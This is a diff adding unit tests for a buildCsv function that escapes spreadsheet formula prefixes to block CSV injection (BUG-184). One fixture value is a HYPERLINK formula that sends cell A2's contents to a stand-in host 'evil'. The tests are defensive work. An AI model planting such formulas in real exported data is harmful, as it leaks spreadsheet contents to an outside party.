@@ -99,4 +99,21 @@ describe('buildCsv', () => {
   it('строк происхождения в CSV нет: они оказались бы прямо в таблице', () => {
     expect(buildCsv({ columns, rows })).not.toContain('Система')
   })
+
+  it('строка, начатая как формула, получает апостроф (CSV-инъекция, BUG-184)', () => {
+    const evil: Row[] = [
+      { id: 'u-3', name: '=HYPERLINK("https://evil/?x="&A2;"Открыть")', blocked: false },
+      { id: '+7 701', name: '-cmd', blocked: false },
+      { id: '@SUM(A1)', name: '\t=1+1', blocked: false },
+    ]
+    const lines = buildCsv({ columns, rows: evil }).split('\r\n')
+    expect(lines[1]).toBe(`"u-3","'=HYPERLINK(""https://evil/?x=""&A2;""Открыть"")","false"`)
+    expect(lines[2]).toBe(`"'+7 701","'-cmd","false"`)
+    expect(lines[3]).toBe(`"'@SUM(A1)","'\t=1+1","false"`)
+  })
+
+  it('числа не трогаются: отрицательное значение счётчика — не формула', () => {
+    const csv = buildCsv({ columns: [{ header: 'Δ', value: () => -5 }], rows: [{}] })
+    expect(csv.split('\r\n')[1]).toBe('"-5"')
+  })
 })
